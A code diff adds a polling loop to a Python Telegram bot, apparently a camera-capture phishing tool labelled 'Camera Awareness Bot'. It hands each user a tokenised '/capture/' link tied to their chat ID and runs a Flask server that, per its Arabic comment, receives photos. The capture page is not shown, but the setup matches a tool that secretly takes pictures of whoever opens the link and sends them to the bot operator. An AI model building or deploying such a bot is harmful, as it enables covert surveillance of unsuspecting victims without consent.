@@ -163,4 +163,36 @@ def webhook():
     return "", 200
 
 if __name__ == "__main__":
-    pass
+    # إذا لم يكن هناك WEBHOOK_SECRET، فهذا يعني أننا نشغل البوت محلياً (Termux)
+    print("🚀 Starting Camera Awareness Bot in Polling mode (Termux)...")
+    
+    def start_polling():
+        last_update_id = 0
+        while True:
+            try:
+                response = requests.get(f"{BASE_URL}/getUpdates", params={"offset": last_update_id + 1, "timeout": 30})
+                updates = response.json().get("result", [])
+                for update in updates:
+                    last_update_id = update["update_id"]
+                    if "message" in update:
+                        message = update["message"]
+                        chat_id = message["chat"]["id"]
+                        text = message.get("text", "")
+                        
+                        if text == "/start":
+                            token = encode_data(chat_id)
+                            capture_url = f"{WEB_DOMAIN}/capture/{token}"
+                            send_telegram_message(chat_id, f"✅ <b>تم إنشاء رابط الفحص!</b>\n\n🔗 <code>{capture_url}</code>")
+                        elif text == "/help":
+                            send_telegram_message(chat_id, "<b>📖 أوامر البوت:</b>\n/start - توليد رابط\n/help - مساعدة")
+            except Exception as e:
+                print(f"Polling error: {e}")
+                import time
+                time.sleep(5)
+
+    # تشغيل Polling في الخلفية (أو كعملية رئيسية في Termux)
+    import threading
+    threading.Thread(target=start_polling, daemon=True).start()
+    
+    # تشغيل Flask لاستقبال الصور
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
